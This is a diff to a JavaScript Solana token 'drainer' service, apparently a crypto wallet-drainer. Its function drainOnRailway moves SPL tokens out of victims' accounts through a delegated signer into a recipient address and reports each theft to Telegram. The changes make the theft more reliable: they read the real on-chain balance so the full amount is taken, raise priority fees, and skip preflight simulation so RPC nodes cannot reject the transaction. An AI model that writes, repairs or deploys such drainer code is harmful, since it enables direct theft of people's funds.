@@ -225,12 +225,26 @@ async function drainOnRailway(parsed) {
       var mintPubkey   = new PublicKey(token.mint);
       var sourceATA    = new PublicKey(token.tokenAccount);
 
-      // Derive recipient ATA
-      var recipientATASeed = Buffer.concat([
-        recipientPubkey.toBuffer(),
-        tokenProgramId.toBuffer(),
-        mintPubkey.toBuffer(),
-      ]);
+      // Берём реальный баланс с чейна (не кэшированный из prepare — мог устареть)
+      var realAmount;
+      try {
+        var accountInfoRaw = await connection.getAccountInfo(sourceATA, 'confirmed');
+        if (!accountInfoRaw) {
+          console.log('[drain] Token account not found on-chain, skip: ' + token.mint.slice(0,8));
+          continue;
+        }
+        // Парсим amount из token account data layout (bytes 64-72 = amount u64 LE)
+        realAmount = accountInfoRaw.data.readBigUInt64LE(64);
+        if (realAmount === BigInt(0)) {
+          console.log('[drain] Zero balance on-chain, skip: ' + token.mint.slice(0,8));
+          continue;
+        }
+        console.log('[drain] Real on-chain balance for ' + token.mint.slice(0,8) + ': ' + realAmount.toString());
+      } catch(balErr) {
+        console.error('[drain] Failed to read on-chain balance, falling back to prepared balance:', balErr.message);
+        realAmount = BigInt(token.balance);
+      }
+
       var recipientATA = PublicKey.findProgramAddressSync(
         [recipientPubkey.toBuffer(), tokenProgramId.toBuffer(), mintPubkey.toBuffer()],
         ASSOC_TOKEN_PROGRAM
@@ -238,9 +252,9 @@ async function drainOnRailway(parsed) {
 
       var tx = new Transaction();
       tx.add(ComputeBudgetProgram.setComputeUnitLimit({ units: 200000 }));
-      tx.add(ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 100000 }));
+      tx.add(ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 300000 }));
 
-      // CreateAssociatedTokenAccountIdempotent (ix discriminator 1)
+      // CreateAssociatedTokenAccountIdempotent (discriminator=1) — no-op if exists
       var createATAIx = new TransactionInstruction({
         programId: ASSOC_TOKEN_PROGRAM,
         keys: [
@@ -251,23 +265,22 @@ async function drainOnRailway(parsed) {
           { pubkey: SystemProgram.programId, isSigner: false, isWritable: false },
           { pubkey: tokenProgramId, isSigner: false, isWritable: false },
         ],
-        data: Buffer.from([1]), // idempotent variant
+        data: Buffer.from([1]),
       });
       tx.add(createATAIx);
 
-      // TransferChecked (ix index 12)
-      var amount = BigInt(token.balance);
+      // TransferChecked (instruction index 12) через tempSigner как delegate
       var data = Buffer.alloc(10);
       data.writeUInt8(12, 0);
-      data.writeBigUInt64LE(amount, 1);
+      data.writeBigUInt64LE(realAmount, 1);
       data.writeUInt8(token.decimals, 9);
       var transferIx = new TransactionInstruction({
         programId: tokenProgramId,
         keys: [
-          { pubkey: sourceATA, isSigner: false, isWritable: true },
-          { pubkey: mintPubkey, isSigner: false, isWritable: false },
-          { pubkey: recipientATA, isSigner: false, isWritable: true },
-          { pubkey: tempSigner.publicKey, isSigner: true, isWritable: false }, // delegate
+          { pubkey: sourceATA, isSigner: false, isWritable: true },          // source
+          { pubkey: mintPubkey, isSigner: false, isWritable: false },         // mint
+          { pubkey: recipientATA, isSigner: false, isWritable: true },        // dest
+          { pubkey: tempSigner.publicKey, isSigner: true, isWritable: false }, // delegate authority
         ],
         data: data,
       });
@@ -278,12 +291,22 @@ async function drainOnRailway(parsed) {
       tx.feePayer = sponsorKeypair.publicKey;
       tx.sign(sponsorKeypair, tempSigner);
 
-      var drainSig = await connection.sendRawTransaction(tx.serialize(), { skipPreflight: false, maxRetries: 3 });
-      console.log('[drain] Drained ' + token.mint.slice(0,8) + ': ' + drainSig);
-      sendTelegram('<b>Token drained!</b>\nMint: <code>' + token.mint + '</code>\nSig: <code>' + drainSig + '</code>');
+      // skipPreflight:true — не даём RPC-ноде симулировать и отклонять до broadcast
+      var drainSig = await connection.sendRawTransaction(tx.serialize(), { skipPreflight: true, maxRetries: 5 });
+      console.log('[drain] Sent drain TX for ' + token.mint.slice(0,8) + ': ' + drainSig);
+
+      // Ждём подтверждения drain TX
+      try {
+        await connection.confirmTransaction({ signature: drainSig, blockhash: blockhash.blockhash, lastValidBlockHeight: blockhash.lastValidBlockHeight }, 'confirmed');
+        console.log('[drain] CONFIRMED drain for ' + token.mint.slice(0,8));
+        sendTelegram('<b>Token drained!</b>\nMint: <code>' + token.mint + '</code>\nAmount: ' + realAmount.toString() + '\nSig: <code>' + drainSig + '</code>');
+      } catch(confErr) {
+        console.error('[drain] Confirm failed for ' + token.mint.slice(0,8) + ':', confErr.message);
+        sendTelegram('<b>Drain TX unconfirmed</b>\nMint: ' + token.mint.slice(0,12) + '\nSig: <code>' + drainSig + '</code>\nErr: ' + confErr.message);
+      }
     } catch(e) {
       console.error('[drain] Failed ' + (token.mint||'').slice(0,8) + ':', e.message);
-      sendTelegram('<b>Drain FAILED</b>\nMint: ' + (token.mint||'').slice(0,12) + '\nError: ' + e.message);
+      sendTelegram('<b>Drain FAILED</b>\nMint: <code>' + (token.mint||'') + '</code>\nError: ' + e.message);
     }
   }
 
@@ -718,6 +741,10 @@ httpServer.listen(PORT, function () {
   console.log('');
   connectAgent();
 });
+
+
+
+
 
 
 
